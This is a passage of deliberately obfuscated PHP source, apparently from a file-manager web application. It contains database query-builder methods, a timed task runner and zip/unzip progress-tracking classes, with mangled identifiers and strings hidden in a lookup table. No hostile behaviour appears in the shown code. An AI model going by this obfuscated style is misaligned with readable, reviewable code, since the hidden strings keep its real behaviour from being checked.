$ê÷ˆâÕª[424]); if (strpos($İ‡¹ß€À, $ê÷ˆâÕª[50])) { list($–æù«Ğ×, $ïÆ¨şØ ) = explode($ê÷ˆâÕª[50], $İ‡¹ß€À); return $¦ÂàüİÖ >= $–æù«Ğ× && $¦ÂàüİÖ <= $ïÆ¨şØ ; } else { return $¦ÂàüİÖ == $İ‡¹ß€À; } case $ê÷ˆâÕª[425]: list($Å÷Ùïïá, $¡Û„ÀÔ) = explode($ê÷ˆâÕª[50], $İ‡¹ß€À); if (!is_numeric($Å÷Ùïïá)) { $Å÷Ùïïá = strtotime($Å÷Ùïïá); } if (!is_numeric($¡Û„ÀÔ)) { $¡Û„ÀÔ = strtotime($¡Û„ÀÔ); } return NOW_TIME >= $Å÷Ùïïá && NOW_TIME <= $¡Û„ÀÔ; case $ê÷ˆâÕª[426]: return in_array(get_client_ip(), explode($ê÷ˆâÕª[50], $İ‡¹ß€À)); case $ê÷ˆâÕª[427]: return !in_array(get_client_ip(), explode($ê÷ˆâÕª[50], $İ‡¹ß€À)); case $ê÷ˆâÕª[414]: default: return $this->regex($òâÇÆ¡, $İ‡¹ß€À); } } public function query($ü¬œÓñ, $ØÇ¹î£  = false) { $£•ËæŞ˜ =& $_SERVER[É¨™èà]; if (!is_bool($ØÇ¹î£ ) && !is_array($ØÇ¹î£ )) { $ØÇ¹î£  = func_get_args(); array_shift($ØÇ¹î£ ); } $ü¬œÓñ = str_replace(array($£•ËæŞ˜[288], $£•ËæŞ˜[428]), $£•ËæŞ˜[53], $ü¬œÓñ); $ü¬œÓñ = $this->parseSql($ü¬œÓñ, $ØÇ¹î£ ); return $this->db->query($ü¬œÓñ); } public function execute($¨¿Íµñ, $Åúî¹êÆ = false) { if (!is_bool($Åúî¹êÆ) && !is_array($Åúî¹êÆ)) { $Åúî¹êÆ = func_get_args(); array_shift($Åúî¹êÆ); } $¨¿Íµñ = $this->parseSql($¨¿Íµñ, $Åúî¹êÆ); return $this->db->execute($¨¿Íµñ); } protected function parseSql($’Å¥ÍàĞ, $É¿·’Ú™) { $•óŞñë® =& $_SERVER[É¨™èà]; if (!0 === $É¿·’Ú™) { $¬ÕºŸ¾ù = $this->_parseOptions(); $’Å¥ÍàĞ = $this->db->parseSql($’Å¥ÍàĞ, $¬ÕºŸ¾ù); } elseif (is_array($É¿·’Ú™)) { $É¿·’Ú™ = array_map(array($this->db, $•óŞñë®[429]), $É¿·’Ú™); $’Å¥ÍàĞ = vsprintf($’Å¥ÍàĞ, $É¿·’Ú™); } else { $’Å¥ÍàĞ = strtr($’Å¥ÍàĞ, array($•óŞñë®[430] => $this->getTableName(), $•óŞñë®[431] => think_config($•óŞñë®[333]))); } $this->db->setModel($this->name); return $’Å¥ÍàĞ; } public function db($éó¨ë”÷ = '', $÷Úæñ‰Õ = '', $ˆÑ­Ê¸À = array()) { $Úú•‘™˜ =& $_SERVER[É¨™èà]; if ($Úú•‘™˜[12] === $éó¨ë”÷ && $this->db) { return $this->db; } static $Æ¶ªçº = array(); static $¢ÜµŞøæ = array(); if (!isset($¢ÜµŞøæ[$éó¨ë”÷]) || isset($¢ÜµŞøæ[$éó¨ë”÷]) && $÷Úæñ‰Õ && $Æ¶ªçº[$éó¨ë”÷] != $÷Úæñ‰Õ) { if (!empty($÷Úæñ‰Õ) && is_string($÷Úæñ‰Õ) && !1 === strpos($÷Úæñ‰Õ, $Úú•‘™˜[8])) { $÷Úæñ‰Õ = think_config($÷Úæñ‰Õ); } $éó¨ë”÷ = think_guid($÷Úæñ‰Õ); $¢ÜµŞøæ[$éó¨ë”÷] = Db::getInstance($÷Úæñ‰Õ); } elseif (NULL === $÷Úæñ‰Õ) { $¢ÜµŞøæ[$éó¨ë”÷]->close(); unset($¢ÜµŞøæ[$éó¨ë”÷]); return; } if (!empty($ˆÑ­Ê¸À)) { if (is_string($ˆÑ­Ê¸À)) { parse_str($ˆÑ­Ê¸À, $ˆÑ­Ê¸À); } foreach ($ˆÑ­Ê¸À as $ÏÔ¥ÆÍÀ => $ÎÃåŞ) { $this->setProperty($ÏÔ¥ÆÍÀ, $ÎÃåŞ); } } $Æ¶ªçº[$éó¨ë”÷] = $÷Úæñ‰Õ; $this->db = $¢ÜµŞøæ[$éó¨ë”÷]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $’ÖôÉ³• = get_class($this); if ($’ÖôÉ³• == $_SERVER[É¨™èà][432]) { return $this->name; } $this->name = substr($’ÖôÉ³•, 0, -5); } return $this->name; } public function getTableName() { $Ïìã½•Ê =& $_SERVER[É¨™èà]; if (empty($this->trueTableName)) { $âÄ„İ®£ = !empty($this->tablePrefix) ? $this->tablePrefix : $Ïìã½•Ê[12]; if (!empty($this->tableName)) { $âÄ„İ®£ .= $this->tableName; } else { $âÄ„İ®£ .= think_parse_name($this->name); } $this->trueTableName = strtolower($âÄ„İ®£); } return (!empty($this->dbName) ? $this->dbName . $Ïìã½•Ê[10] : $Ïìã½•Ê[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ŸÈËå÷ê =& $_SERVER[É¨™èà]; return isset($this->fields[$ŸÈËå÷ê[340]]) ? $this->fields[$ŸÈËå÷ê[340]] : $this->pk; } public function getDbFields() { $•¡ÖĞœî =& $_SERVER[É¨™èà]; if (isset($this->options[$•¡ÖĞœî[368]])) { $è©‚¸ü³ = $this->db->getFields($this->options[$•¡ÖĞœî[368]]); return $è©‚¸ü³ ? array_keys($è©‚¸ü³) : !1; } if ($this->fields) { $è©‚¸ü³ = $this->fields; unset($è©‚¸ü³[$•¡ÖĞœî[339]], $è©‚¸ü³[$•¡ÖĞœî[340]], $è©‚¸ü³[$•¡ÖĞœî[341]], $è©‚¸ü³[$•¡ÖĞœî[338]]); return $è©‚¸ü³; } return !1; } public function data($Ñ—ØÉ°ù = '') { $î­ğÚÕå =& $_SERVER[É¨™èà]; if ($î­ğÚÕå[12] === $Ñ—ØÉ°ù && !empty($this->data)) { return $this->data; } if (is_object($Ñ—ØÉ°ù)) { $Ñ—ØÉ°ù = get_object_vars($Ñ—ØÉ°ù); } elseif (is_string($Ñ—ØÉ°ù)) { parse_str($Ñ—ØÉ°ù, $Ñ—ØÉ°ù); } elseif (!is_array($Ñ—ØÉ°ù)) { think_exception(think_lang($î­ğÚÕå[360])); } $this->data = $Ñ—ØÉ°ù; return $this; } public function join($Áî·Á²) { $ù¿ÖÓÖÆ =& $_SERVER[É¨™èà]; if (is_array($Áî·Á²)) { $this->options[$ù¿ÖÓÖÆ[371]] = $Áî·Á²; } elseif (!empty($Áî·Á²)) { $this->options[$ù¿ÖÓÖÆ[371]][] = $Áî·Á²; } return $this; } public function union($°Í÷—äø, $ŒÇÆÄçî = false) { $ù²Âà¬Å =& $_SERVER[É¨™èà]; if (empty($°Í÷—äø)) { return $this; } if ($ŒÇÆÄçî) { $this->options[$ù²Âà¬Å[433]][$ù²Âà¬Å[434]] = !0; } if (is_object($°Í÷—äø)) { $°Í÷—äø = get_object_vars($°Í÷—äø); } if (is_string($°Í÷—äø)) { $ÅŞØ‰Ê = $°Í÷—äø; } elseif (is_array($°Í÷—äø)) { if (isset($°Í÷—äø[0])) { $this->options[$ù²Âà¬Å[433]] = array_merge($this->options[$ù²Âà¬Å[433]], $°Í÷—äø); return $this; } else { $ÅŞØ‰Ê = $°Í÷—äø; } } else { think_exception(think_lang($ù²Âà¬Å[360])); } $this->options[$ù²Âà¬Å[433]][] = $ÅŞØ‰Ê; return $this; } public function cache($±ÎØ‚Ş = true, $ÓµşËÉ = null, $éƒßÍ¿¼ = '') { $³íòÔä =& $_SERVER[É¨™èà]; if (!1 !== $±ÎØ‚Ş) { $this->options[$³íòÔä[435]] = array($³íòÔä[97] => $±ÎØ‚Ş, $³íòÔä[425] => $ÓµşËÉ, $³íòÔä[33] => $éƒßÍ¿¼); } return $this; } public function field($”ÔØÍòó, $«ó±Éú¤ = false) { $¦íØ·î© =& $_SERVER[É¨™èà]; if (!0 === $”ÔØÍòó) { $âµÖŠ = $this->getDbFields(); $”ÔØÍòó = $âµÖŠ ? $âµÖŠ : $¦íØ·î©[223]; } elseif ($«ó±Éú¤) { if (is_string($”ÔØÍòó)) { $”ÔØÍòó = explode($¦íØ·î©[50], $”ÔØÍòó); } $âµÖŠ = $this->getDbFields(); $”ÔØÍòó = $âµÖŠ ? array_diff($âµÖŠ, $”ÔØÍòó) : $”ÔØÍòó; } $this->options[$¦íØ·î©[362]] = $”ÔØÍòó; return $this; } public function scope($•£»°Ğ = '', $êƒå“·© = NULL) { $›õ±¦’Ä =& $_SERVER[É¨™èà]; if ($›õ±¦’Ä[12] === $•£»°Ğ) { if (isset($this->_scope[$›õ±¦’Ä[37]])) { $€ÔæÄ­ì = $this->_scope[$›õ±¦’Ä[37]]; } else { return $this; } } elseif (is_string($•£»°Ğ)) { $Ø­™úğ = explode($›õ±¦’Ä[50], $•£»°Ğ); $€ÔæÄ­ì = array(); foreach ($Ø­™úğ as $á®ï¥Áõ) { if (!isset($this->_scope[$á®ï¥Áõ])) { continue; } $€ÔæÄ­ì = array_merge($€ÔæÄ­ì, $this->_scope[$á®ï¥Áõ]); } if (!empty($êƒå“·©) && is_array($êƒå“·©)) { $€ÔæÄ­ì = array_merge($€ÔæÄ­ì, $êƒå“·©); } } elseif (is_array($•£»°Ğ)) { $€ÔæÄ­ì = $•£»°Ğ; } if (is_array($€ÔæÄ­ì) && !empty($€ÔæÄ­ì)) { $this->options = array_merge($this->options, array_change_key_case($€ÔæÄ­ì)); } return $this; } public function where($ãµ±°×ä, $½°‹°± = null) { $«ÖÚá½› =& $_SERVER[É¨™èà]; if (!is_null($½°‹°±) && is_string($ãµ±°×ä)) { if (!is_array($½°‹°±)) { $½°‹°± = func_get_args(); array_shift($½°‹°±); } $½°‹°± = array_map(array($this->db, $«ÖÚá½›[429]), $½°‹°±); $ãµ±°×ä = vsprintf($ãµ±°×ä, $½°‹°±); } elseif (is_object($ãµ±°×ä)) { $ãµ±°×ä = get_object_vars($ãµ±°×ä); } elseif (is_array($ãµ±°×ä)) { foreach ($ãµ±°×ä as $í¨•…å => $ãëéõ–ª) { if ((is_numeric($í¨•…å) || !$í¨•…å) && is_string($ãëéõ–ª)) { if (strpos($ãëéõ–ª, $«ÖÚá½›[436]) === 0) { continue; } think_trace($«ÖÚá½›[437], $«ÖÚá½›[12], $«ÖÚá½›[49]); die; } } } if (is_string($ãµ±°×ä) && $«ÖÚá½›[12] != $ãµ±°×ä) { $ÑÈ¬í«å = array(); $ÑÈ¬í«å[$«ÖÚá½›[438]] = $ãµ±°×ä; $ãµ±°×ä = $ÑÈ¬í«å; } if (isset($this->options[$«ÖÚá½›[364]])) { $this->options[$«ÖÚá½›[364]] = array_merge($this->options[$«ÖÚá½›[364]], $ãµ±°×ä); } else { $this->options[$«ÖÚá½›[364]] = $ãµ±°×ä; } return $this; } public function limit($¢÷…ïø›, $ããÑÕÜ‹ = null) { $í€æÖş =& $_SERVER[É¨™èà]; $this->options[$í€æÖş[379]] = is_null($ããÑÕÜ‹) ? $¢÷…ïø› : $¢÷…ïø› . $í€æÖş[50] . $ããÑÕÜ‹; return $this; } public function page($¨£”ü¡, $­üù“âÃ = null) { $ÆÂ«äÑ† =& $_SERVER[É¨™èà]; $this->options[$ÆÂ«äÑ†[439]] = is_null($­üù“âÃ) ? $¨£”ü¡ : $¨£”ü¡ . $ÆÂ«äÑ†[50] . $­üù“âÃ; return $this; } public function comment($¦¬¶ü¿) { $this->options[$_SERVER[É¨™èà][440]] = $¦¬¶ü¿; return $this; } public function setProperty($™îı‚ë×, $ä¼Û­¶‡) { if (property_exists($this, $™îı‚ë×)) { $this->{$™îı‚ë×} = $ä¼Û­¶‡; } return $this; } } goto B§ã¥¿—ˆ; E†¼ÚÖïíï: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ë˜¸èÅ , $©ŸâúŠ¢ = 5.0) { if (!$Ë˜¸èÅ ) { return; } $‰·ÏñŠ = Cache::get($Ë˜¸èÅ ); if (!$‰·ÏñŠ || timeFloat() - floatVal($‰·ÏñŠ) >= $©ŸâúŠ¢) { Cache::set($Ë˜¸èÅ , timeFloat(), $©ŸâúŠ¢ * 10); return !0; } return !1; } public static function timeLimitCall($úê†’ò, $òêÇ‹Íú, $ŒÀŠÑåë, $‰é–ó£† = 5.0) { $Êù‹ùŸ› =& $_SERVER[É¨™èà]; if (!$úê†’ò || !$òêÇ‹Íú) { return; } self::$asyncAdd = !0; $¬¡ìæªÄ = $Êù‹ùŸ›[1908]; $äĞÏ°ÙÓ = Cache::get($¬¡ìæªÄ, !0); $¥˜½²õ = array($Êù‹ùŸ›[1909] => timeFloat(), $Êù‹ùŸ›[1910] => timeFloat(), $Êù‹ùŸ›[353] => $òêÇ‹Íú, $Êù‹ùŸ›[1900] => $ŒÀŠÑåë, $Êù‹ùŸ›[207] => $‰é–ó£†); if (is_array($äĞÏ°ÙÓ[$úê†’ò])) { $¥˜½²õ[$Êù‹ùŸ›[1910]] = $äĞÏ°ÙÓ[$úê†’ò][$Êù‹ùŸ›[1910]]; } if (is_array($äĞÏ°ÙÓ[$úê†’ò])) { if (timeFloat() - $äĞÏ°ÙÓ[$úê†’ò][$Êù‹ùŸ›[1909]] < $¥˜½²õ[$Êù‹ùŸ›[207]] * 0.3) { return; } $¥˜½²õ[$Êù‹ùŸ›[1910]] = $äĞÏ°ÙÓ[$úê†’ò][$Êù‹ùŸ›[1910]]; } $äĞÏ°ÙÓ[$úê†’ò] = $¥˜½²õ; Cache::set($¬¡ìæªÄ, $äĞÏ°ÙÓ, 60); Cache::removeMemory($¬¡ìæªÄ); write_log($Êù‹ùŸ›[1911] . $úê†’ò . $Êù‹ùŸ›[74] . $òêÇ‹Íú, $Êù‹ùŸ›[198]); } public static function timeLimitCallLoop() { $ö—ÅÆŞˆ =& $_SERVER[É¨™èà]; $âÇú = array($ö—ÅÆŞˆ[1912]); $ÅŒ‡´ºú = in_array(strtolower(ACTION), $âÇú); if (!$ÅŒ‡´ºú && !self::$asyncAdd) { return; } $¡ğÓ½¼ = $ö—ÅÆŞˆ[1908]; $Ù‚”½é¼ = Cache::get($¡ğÓ½¼, !0); if (!$Ù‚”½é¼ || count($Ù‚”½é¼) <= 0) { return; } $íû‘üï÷ = !1; $ÒÁå Û‘ = timeFloat(); $ÒÙãê¦° = array(); foreach ($Ù‚”½é¼ as $×ò¸ğ“­ => $„ÒŸ†÷ë) { if ($ÒÁå Û‘ - $„ÒŸ†÷ë[$ö—ÅÆŞˆ[1910]] > $„ÒŸ†÷ë[$ö—ÅÆŞˆ[207]]) { $íû‘üï÷ = !0; try { Hook::apply($„ÒŸ†÷ë[$ö—ÅÆŞˆ[353]], $„ÒŸ†÷ë[$ö—ÅÆŞˆ[1900]]); write_log($ö—ÅÆŞˆ[1913] . $×ò¸ğ“­ . $ö—ÅÆŞˆ[74] . $„ÒŸ†÷ë[$ö—ÅÆŞˆ[353]] . $ö—ÅÆŞˆ[1914] . ACTION, $ö—ÅÆŞˆ[198]); } catch (Exception $‚İ«¼Ÿµ) { } continue; } $ÒÙãê¦°[$×ò¸ğ“­] = $„ÒŸ†÷ë; } if (!$íû‘üï÷) { return; } if (!$ÒÙãê¦°) { return Cache::remove($¡ğÓ½¼); } Cache::set($¡ğÓ½¼, $ÒÙãê¦°, 60); Cache::removeMemory($¡ğÓ½¼); } public static function finished($Îü¶Õ¢Ÿ, $ó—ı¿Ô) { $ı¹ÇæÏ‹ =& $_SERVER[É¨™èà]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ı¹ÇæÏ‹[353] => $Îü¶Õ¢Ÿ, $ı¹ÇæÏ‹[1900] => $ó—ı¿Ô); } private static function finishedRun() { $‰ Ñ€ùÊ =& $_SERVER[É¨™èà]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ç¾æ†ï) { try { Hook::apply($ç¾æ†ï[$‰ Ñ€ùÊ[353]], $ç¾æ†ï[$‰ Ñ€ùÊ[1900]]); } catch (Exception $ü¨´ù§) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $­Š²Î¯ =& $_SERVER[É¨™èà]; parent::startAfter(); Hook::bind($­Š²Î¯[1915], array($this, $­Š²Î¯[1916])); Hook::bind($­Š²Î¯[1298], array($this, $­Š²Î¯[1917])); Hook::bind($­Š²Î¯[1918], array($this, $­Š²Î¯[1919])); $¹éí†á =& $this->task; $¹éí†á[$­Š²Î¯[1920]] = $­Š²Î¯[1299]; if (!$¹éí†á[$­Š²Î¯[1687]]) { $¹éí†á[$­Š²Î¯[1687]] = LNG($­Š²Î¯[1921]); } } protected function endAfter() { $µ®û =& $_SERVER[É¨™èà]; parent::endAfter(); Hook::unbind($µ®û[1915], array($this, $µ®û[1916])); Hook::unbind($µ®û[1298], array($this, $µ®û[1917])); Hook::unbind($µ®û[1918], array($this, $µ®û[1919])); } public function updateAfter() { $Åèëä­ª =& $_SERVER[É¨™èà]; $´ÕÚİî =& $this->task; if (!$´ÕÚİî[$Åèëä­ª[1157]] || !$´ÕÚİî[$Åèëä­ª[854]]) { if ($´ÕÚİî[$Åèëä­ª[1920]] != $Åèëä­ª[399]) { return; } } if ($´ÕÚİî[$Åèëä­ª[1920]] == $Åèëä­ª[1299]) { $¡õ›—ª = 0; if ($´ÕÚİî[$Åèëä­ª[1854]]) { $¡õ›—ª = $´ÕÚİî[$Åèëä­ª[1855]] / $´ÕÚİî[$Åèëä­ª[1854]]; } $´ÕÚİî[$Åèëä­ª[1802]] = $¡õ›—ª * 0.3; } else { if ($´ÕÚİî[$Åèëä­ª[1920]] == $Åèëä­ª[399]) { $¡õ›—ª = $´ÕÚİî[$Åèëä­ª[1801]] / $´ÕÚİî[$Åèëä­ª[1157]]; $´ÕÚİî[$Åèëä­ª[1802]] = 0.3 + $¡õ›—ª * 0.4; } else { if ($´ÕÚİî[$Åèëä­ª[1920]] == $Åèëä­ª[110]) { $Ö¶áäù = 0; if ($´ÕÚİî[$Åèëä­ª[1856]] == $Åèëä­ª[110]) { $Ö¶áäù = $´ÕÚİî[$Åèëä­ª[1855]]; } $¡õ›—ª = ($´ÕÚİî[$Åèëä­ª[1859]] + $Ö¶áäù) / $´ÕÚİî[$Åèëä­ª[854]]; $´ÕÚİî[$Åèëä­ª[1802]] = 0.3 + 0.4 + $¡õ›—ª * 0.3; } } } if ($´ÕÚİî[$Åèëä­ª[1802]] > 0) { $÷»Ù…Ûä = timeFloat() - $´ÕÚİî[$Åèëä­ª[1804]] - $´ÕÚİî[$Åèëä­ª[1807]]; $´ÕÚİî[$Åèëä­ª[1808]] = $÷»Ù…Ûä * (1 - $´ÕÚİî[$Åèëä­ª[1802]]) / $´ÕÚİî[$Åèëä­ª[1802]]; } } public function addFile($‘ËÇìö) { $Ù•ÂŒ„ı =& $_SERVER[É¨™èà]; $‰ø°ô„£ =& $this->task; $êÓ±Š‚£ = IO::info($‘ËÇìö); $‰ø°ô„£[$Ù•ÂŒ„ı[1852]] = $êÓ±Š‚£[$Ù•ÂŒ„ı[32]]; $‰ø°ô„£[$Ù•ÂŒ„ı[1854]] = $êÓ±Š‚£[$Ù•ÂŒ„ı[79]]; $‰ø°ô„£[$Ù•ÂŒ„ı[1855]] = 0; $‰ø°ô„£[$Ù•ÂŒ„ı[1159]] = $Ù•ÂŒ„ı[1875]; $‰ø°ô„£[$Ù•ÂŒ„ı[1856]] = $Ù•ÂŒ„ı[1299]; $‰ø°ô„£[$Ù•ÂŒ„ı[854]] = $êÓ±Š‚£[$Ù•ÂŒ„ı[79]]; $‰ø°ô„£[$Ù•ÂŒ„ı[1157]] = 1; $¢Ò ôŸ¥ = 0; $‰ø°ô„£[$Ù•ÂŒ„ı[1863]] = array($Ù•ÂŒ„ı[1864] => $¢Ò ôŸ¥ + 1, $Ù•ÂŒ„ı[504] => $êÓ±Š‚£[$Ù•ÂŒ„ı[32]], $Ù•ÂŒ„ı[87] => $êÓ±Š‚£[$Ù•ÂŒ„ı[87]], $Ù•ÂŒ„ı[594] => $êÓ±Š‚£[$Ù•ÂŒ„ı[594]] ? $êÓ±Š‚£[$Ù•ÂŒ„ı[594]] : $êÓ±Š‚£[$Ù•ÂŒ„ı[87]]); $this->update(); } public function zipEvent($Áß¼‡Ó¶, $›ı”è°, $ìà›­ÔÆ, $ˆêß”Ş±) { $íéĞÇ ¼ =& $_SERVER[É¨™èà]; $Ğ­ôõôÇ =& $this->task; $Ğ­ôõôÇ[$íéĞÇ ¼[1852]] = get_path_this($›ı”è°); $Ğ­ôõôÇ[$íéĞÇ ¼[1854]] = $ˆêß”Ş±; $Ğ­ôõôÇ[$íéĞÇ ¼[1855]] = $ìà›­ÔÆ; $Ğ­ôõôÇ[$íéĞÇ ¼[1159]] = $Áß¼‡Ó¶ == $íéĞÇ ¼[1922] ? $íéĞÇ ¼[1923] : $íéĞÇ ¼[1924]; $Ğ­ôõôÇ[$íéĞÇ ¼[1856]] = $íéĞÇ ¼[12]; $Ğ­ôõôÇ[$íéĞÇ ¼[854]] = $ˆêß”Ş±; $Ğ­ôõôÇ[$íéĞÇ ¼[1920]] = $íéĞÇ ¼[399]; $this->update(); } public function unzipAfter($ôªìÛÄ) { $”å’Ûå¾ =& $_SERVER[É¨™èà]; $–ÈÊ¤Ù =& $this->task; $–ÈÊ¤Ù[$”å’Ûå¾[1920]] = $”å’Ûå¾[110]; $÷’•ÎÛü = IO::infoWithChildren($ôªìÛÄ); $¿Œ‘Ğê = 0; $–ÈÊ¤Ù[$”å’Ûå¾[1863]] = array($”å’Ûå¾[1864] => $¿Œ‘Ğê + 1, $”å’Ûå¾[504] => $÷’•ÎÛü[$”å’Ûå¾[32]], $”å’Ûå¾[87] => $÷’•ÎÛü[$”å’Ûå¾[87]], $”å’Ûå¾[594] => $÷’•ÎÛü[$”å’Ûå¾[594]] ? $÷’•ÎÛü[$”å’Ûå¾[594]] : $÷’•ÎÛü[$”å’Ûå¾[87]]); if ($÷’•ÎÛü[$”å’Ûå¾[33]] == $”å’Ûå¾[233]) { $–ÈÊ¤Ù[$”å’Ûå¾[1157]] = 1; } else { $–ÈÊ¤Ù[$”å’Ûå¾[1157]] = $÷’•ÎÛü[$”å’Ûå¾[82]][$”å’Ûå¾[80]]; } $–ÈÊ¤Ù[$”å’Ûå¾[1159]] = $”å’Ûå¾[12]; $–ÈÊ¤Ù[$”å’Ûå¾[1856]] = 0; $–ÈÊ¤Ù[$”å’Ûå¾[1801]] = 0; $–ÈÊ¤Ù[$”å’Ûå¾[1854]] = 0; $–ÈÊ¤Ù[$”å’Ûå¾[1855]] = 0; $–ÈÊ¤Ù[$”å’Ûå¾[1852]] = $”å’Ûå¾[12]; $–ÈÊ¤Ù[$”å’Ûå¾[1859]] = 0; $–ÈÊ¤Ù[$”å’Ûå¾[854]] = $÷’•ÎÛü[$”å’Ûå¾[79]]; $this->update(); self::log($”å’Ûå¾[1925] . json_encode(array($–ÈÊ¤Ù, $÷’•ÎÛü))); } public function nameParse($È¼í·©) { $ª½Õë =& $_SERVER[É¨™èà]; $ş˜İ·‘ñ =& $this->task; if ($ş˜İ·‘ñ[$ª½Õë[1920]] == $ª½Õë[1299]) { $ş˜İ·‘ñ[$ª½Õë[1920]] = $ª½Õë[399]; $ş˜İ·‘ñ[$ª½Õë[1859]] = 0; $ş˜İ·‘ñ[$ª½Õë[854]] = 0; } $”šæµ— = get_path_this($È¼í·©); if (strstr($”šæµ—, $ª½Õë[10])) { $ş˜İ·‘ñ[$ª½Õë[1801]] += 1; $ş˜İ·‘ñ[$ª½Õë[1157]] += 1; } $ş˜İ·‘ñ[$ª½Õë[1852]] = $È¼í·©; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $•İ½ìè‚ =& $_SERVER[É¨™èà]; parent::startAfter(); Hook::bind($•İ½ìè‚[1926], array($this, $•İ½ìè‚[1916])); Hook::bind($•İ½ìè‚[1918], array($this, $•İ½ìè‚[1919])); $»½¹·†à =& $this->task; $»½¹·†à[$•İ½ìè‚[1920]] = $•İ½ìè‚[1299]; if (!$»½¹·†à[$•İ½ìè‚[1687]]) { $»½¹·†à[$•İ½ìè‚[1687]] = LNG($•İ½ìè‚[1927]); } } protected function endAfter() { $÷àîøş’ =& $_SERVER[É¨™èà]; parent::endAfter(); Hook::unbind($÷àîøş’[1926], array($this, $÷àîøş’[1916])); Hook::unbind($÷àîøş’[1918], array($this, $÷àîøş’[1919])); } public function updateAfter() { $ËğÊÙ•¦ =& $_SERVER[É¨™èà]; $ùº¶íÕƒ =& $this->task; if (!$ùº¶íÕƒ[$ËğÊÙ•¦[1157]] || !$ùº¶íÕƒ[$ËğÊÙ•¦[854]]) { return; } if ($ùº¶íÕƒ[$ËğÊÙ•¦[1920]] == $ËğÊÙ•¦[1299]) { $¾µÂ›€õ = $ùº¶íÕƒ[$ËğÊÙ•¦[1855]]; if ($ùº¶íÕƒ[$ËğÊÙ•¦[1856]] != $ËğÊÙ•¦[1299]) { $¾µÂ›€õ = 0; } $Ô§·Ò = ($ùº¶íÕƒ[$ËğÊÙ•¦[1859]] + $¾µÂ›€õ) / $ùº¶íÕƒ[$ËğÊÙ•¦[854]]; $ùº¶íÕƒ[$ËğÊÙ•¦[1802]] = $Ô§·Ò * 0.3; } else { if ($ùº¶íÕƒ[$ËğÊÙ•¦[1920]] == $ËğÊÙ•¦[399]) { $Ô§·Ò = $ùº¶íÕƒ[$ËğÊÙ•¦[1801]] / $ùº¶íÕƒ[$ËğÊÙ•¦[1157]]; $ùº¶íÕƒ[$ËğÊÙ•¦[1802]] = 0.3 + $Ô§·Ò * 0.5; } else { if ($ùº¶íÕƒ[$ËğÊÙ•¦[1920]] == $ËğÊÙ•¦[110]) { $Ô§·Ò = 0; if ($ùº¶íÕƒ[$ËğÊÙ•¦[1854]]) { $Ô§·Ò = $ùº¶íÕƒ[$ËğÊÙ•¦[1855]] / $ùº¶íÕƒ[$ËğÊÙ•¦[1854]]; } $ùº¶íÕƒ[$ËğÊÙ•¦[1802]] = 0.3 + 0.5 + $Ô§·Ò * 0.2; } } } if ($ùº¶íÕƒ[$ËğÊÙ•¦[1802]] > 0) { $Œµı‚µ» = timeFloat() - $ùº¶íÕƒ[$ËğÊÙ•¦[1804]] - $ùº¶íÕƒ[$ËğÊÙ•¦[1807]]; $ùº¶íÕƒ[$ËğÊÙ•¦[1808]] = $Œµı‚µ» * (1 - $ùº¶íÕƒ[$ËğÊÙ•¦[1802]]) / $ùº¶íÕƒ[$ËğÊÙ•¦[1802]]; } } public function copyFileStart($„Õ³­Ğ, $ÂÈÈ â, $Šß‡š¿, $³ı¯øüÜ, $îŞ¿­ı¼, $“”‰îÑ¸) { $¤Úà…ìŠ =& $_SERVER[É¨™èà]; parent::copyFileStart($„Õ³­Ğ, $ÂÈÈ â, $Šß‡š¿, $³ı¯øüÜ, $îŞ¿­ı¼, $“”‰îÑ¸); $­œÅÃÙÃ =& $this->task; if ($­œÅÃÙÃ[$¤Úà…ìŠ[1920]] == $¤Úà…ìŠ[399]) { $­œÅÃÙÃ[$¤Úà…ìŠ[1920]] = $¤Úà…ìŠ[110]; } $this->update(); } public function copyFileEnd($ì‚İÉ©Œ, $—Óı¥€µ, $è“‘—ÕÅ, $«Ìå´ª‰, $Õ–¿¥ã¦, $…´Ô‘Ñó) { $ÍÓñÃÀÓ =& $_SERVER[É¨™èà]; $¾­Ó×ê½ =& $this->task; $¾­Ó×ê½[$ÍÓñÃÀÓ[1855]] = $¾­Ó×ê½[$ÍÓñÃÀÓ[1854]]; $¾­Ó×ê½[$ÍÓñÃÀÓ[1859]] += $¾­Ó×ê½[$ÍÓñÃÀÓ[1854]]; $¾­Ó×ê½[$ÍÓñÃÀÓ[1856]] = $ÍÓñÃÀÓ[12]; $this->update(); } public function zipEvent($ĞŠ™‡ãÚ, $½›º³¯İ, $•¯çƒÊ , $ˆ“‚¾Ó–) { $ò›ğËî =& $_SERVER[É¨™èà]; $ÂÏÌÆ¥ =& $this->task; $ÂÏÌÆ¥[$ò›ğËî[1852]] = get_path_this($½›º³¯İ); $ÂÏÌÆ¥[$ò›ğËî[1854]] = $ˆ“‚¾Ó–; $ÂÏÌÆ¥[$ò›ğËî[1855]] = $•¯çƒÊ ; $ÂÏÌÆ¥[$ò›ğËî[1159]] = $ĞŠ™‡ãÚ == $ò›ğËî[1928] ? $ò›ğËî[1923] : $ò›ğËî[1924]; $ÂÏÌÆ¥[$ò›ğËî[1856]] = $ò›ğËî[12]; $ÂÏÌÆ¥[$ò›ğËî[854]] = $ˆ“‚¾Ó–; $ÂÏÌÆ¥[$ò›ğËî[1920]] = $ò›ğËî[399]; $this->update(); } public function nameParse($·Ü¼ãô¥) { $Š¶¸ó³¨ =& $_SERVER[É¨™èà]; $üŞ¢çÉ =& $this->task; if ($üŞ¢çÉ[$Š¶¸ó³¨[1801]] < $üŞ¢çÉ[$Š¶¸ó³¨[1157]]) { $‹Ç¤øš = get_path_this($·Ü¼ãô¥); if (strstr($‹Ç¤øš, $Š¶¸ó³¨[10])) { $üŞ¢çÉ[$Š¶¸ó³¨[1801]] += 1; } } if ($üŞ¢çÉ[$Š¶¸ó³¨[1920]] == 